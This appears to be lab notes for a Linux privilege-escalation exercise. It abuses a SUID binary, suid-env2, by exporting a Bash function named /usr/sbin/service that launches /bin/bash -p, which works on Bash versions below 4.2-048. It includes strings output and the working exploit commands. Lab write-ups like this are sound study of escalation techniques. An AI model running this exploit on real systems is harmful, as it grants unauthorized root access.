1. The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
2. In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
3. `strings suid-env2`
```
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
4. Make a new function for the program and export it
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
5. The run the program suid-env2
